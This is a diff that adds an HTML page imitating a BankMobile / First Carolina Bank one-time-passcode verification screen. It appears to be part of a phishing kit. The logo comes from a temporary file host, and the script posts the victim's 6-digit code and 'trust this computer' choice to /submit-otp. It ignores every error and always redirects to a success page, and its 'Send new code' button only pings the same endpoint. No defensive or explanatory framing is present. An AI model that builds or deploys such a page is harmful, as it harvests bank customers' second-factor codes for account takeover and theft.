@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BankMobile Authentication</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, Helvetica, sans-serif; background-color: #ffffff; color: #333; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .top-accent { width: 100%; height: 1px; background-color: #7eb344; margin-top: 60px; max-width: 1200px; }
+        .container { width: 100%; max-width: 900px; padding: 40px 20px 20px; text-align: center; flex: 1; }
+        .auth-box { border: 1px solid #a3d06d; border-radius: 8px; padding: 50px 40px; margin: 0 auto; max-width: 580px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 0 0 1px #d9eebf, 0 0 8px rgba(163, 208, 109, 0.3); }
+        .lock-img { width: 55px; height: 55px; margin-bottom: 25px; }
+        .instruction { font-size: 16px; line-height: 1.5; color: #333; margin-bottom: 25px; max-width: 420px; }
+        .instruction b { font-weight: 700; }
+        .otp-field { width: 200px; padding: 10px; border: 1px solid #a3d06d; border-radius: 4px; font-size: 15px; text-align: center; margin-bottom: 8px; color: #333; outline: none; box-shadow: 0 0 6px rgba(163, 208, 109, 0.6); }
+        .otp-field::placeholder { color: #bbb; }
+        .otp-field:focus { box-shadow: 0 0 8px rgba(163, 208, 109, 0.8); }
+        .otp-field.error { border-color: #d93025; box-shadow: 0 0 6px rgba(217, 48, 37, 0.4); }
+        .error-msg { color: #d93025; font-size: 12px; margin-bottom: 10px; display: none; font-weight: bold; }
+        .error-msg.show { display: block; }
+        .trust-device { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 25px; cursor: pointer; color: #333; }
+        .trust-device input { margin: 0; }
+        .btn-row { display: flex; gap: 8px; margin-bottom: 35px; }
+        .btn { background: #fff; border: 1px solid #999; padding: 8px 20px; border-radius: 4px; font-size: 14px; cursor: pointer; transition: background 0.2s; min-width: 85px; color: #333; }
+        .btn:hover { background: #f5f5f5; border-color: #666; }
+        .resend-row { display: flex; align-items: center; gap: 10px; font-size: 14px; color: #333; }
+        .legal-text { font-size: 10px; color: #333; line-height: 1.5; margin-top: 25px; max-width: 700px; padding: 0 20px; margin-left: auto; margin-right: auto; }
+        .legal-text a { color: #333; text-decoration: underline; font-weight: 700; }
+        .footer { width: 100%; border-top: 2px solid #ccc; padding: 25px 20px 40px; margin-top: 30px; text-align: center; }
+        .footer-links { font-size: 12px; margin-bottom: 50px; }
+        .footer-links a { color: #333; text-decoration: underline; margin: 0 3px; font-weight: 700; }
+        .bank-logos { margin-bottom: 50px; }
+        .bank-logos img { height: 45px; width: auto; }
+        .copyright { font-size: 10px; color: #333; line-height: 1.6; max-width: 700px; margin: 0 auto; }
+        .copyright p { margin-bottom: 8px; }
+    </style>
+</head>
+<body>
+
+    <div class="top-accent"></div>
+
+    <div class="container">
+        <div class="auth-box">
+            <svg class="lock-img" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C9.243 2 7 4.243 7 7V9H6C4.895 9 4 9.895 4 11V20C4 21.105 4.895 22 6 22H18C19.105 22 20 21.105 20 20V11C20 9.895 19.105 9 18 9H17V7C17 4.243 14.757 2 12 2ZM12 4C13.654 4 15 5.346 15 7V9H9V7C9 5.346 10.346 4 12 4ZM12 13C12.552 13 13 13.448 13 14V17C13 17.552 12.552 18 12 18C11.448 18 11 17.552 11 17V14C11 13.448 11.448 13 12 13Z" fill="#7eb344"/>
+            </svg>
+            
+            <p class="instruction">We sent a secure code to your <b>mobile phone</b>. Once you receive your code, enter it below.</p>
+
+            <input type="text" class="otp-field" id="otpInput" placeholder="Enter 6-digit code" maxlength="6">
+            <div class="error-msg" id="otpError">Please enter a valid 6-digit code.</div>
+
+            <label class="trust-device">
+                <input type="checkbox" id="trustDevice"> Trust this computer.
+            </label>
+
+            <div class="btn-row">
+                <button class="btn" id="goBackBtn">Go Back</button>
+                <button class="btn" id="submitBtn">Submit</button>
+            </div>
+
+            <div class="resend-section">
+                <div class="resend-row">
+                    <span>Didn't receive a code?</span>
+                    <button class="btn" id="resendBtn">Send new code</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="legal-text">
+            <p>1 message/request. To opt out, text STOP to 23951 or remove the mobile number from your profile. For help, text HELP to 23951. Message and data rates may apply.</p>
+            <p style="margin-top: 12px;">Please review the <a href="#">Privacy Policy</a> and <a href="#">Terms and Conditions</a>.</p>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Privacy Statement</a> | <a href="#">Privacy Notice for California Residents</a>
+        </div>
+        <div class="bank-logos">
+            <img src="https://pub.mini-tools.uk/30-day/db986403-4750-45d2-a56b-c211625ed653.png" alt="First Carolina Bank | BM Technologies, Inc." style="height: 45px; width: auto;">
+        </div>
+        <div class="copyright">
+            <p>© 2026 Powered by BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.</p>
+            <p>BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC & Equal Housing Lender.</p>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const otpInput = document.getElementById('otpInput');
+            const otpError = document.getElementById('otpError');
+            const otp = otpInput.value.trim();
+
+            otpInput.classList.remove('error');
+            otpError.classList.remove('show');
+
+            const otpPattern = /^\d{6}$/;
+            if (!otpPattern.test(otp)) {
+                otpInput.classList.add('error');
+                otpError.classList.add('show');
+                otpInput.focus();
+                return;
+            }
+
+            const trusted = document.getElementById('trustDevice').checked;
+
+            try {
+                await fetch('/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp, trusted })
+                });
+            } catch (e) {}
+
+            window.location.href = "success.html";
+        });
+
+        document.getElementById('resendBtn').addEventListener('click', async () => {
+            try {
+                await fetch('/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp: 'RESEND_REQUEST', trusted: false })
+                });
+            } catch (e) {}
+            alert('New code sent');
+        });
+
+        document.getElementById('goBackBtn').addEventListener('click', () => {
+            window.history.back();
+        });
+    </script>
+
+</body>
+</html>
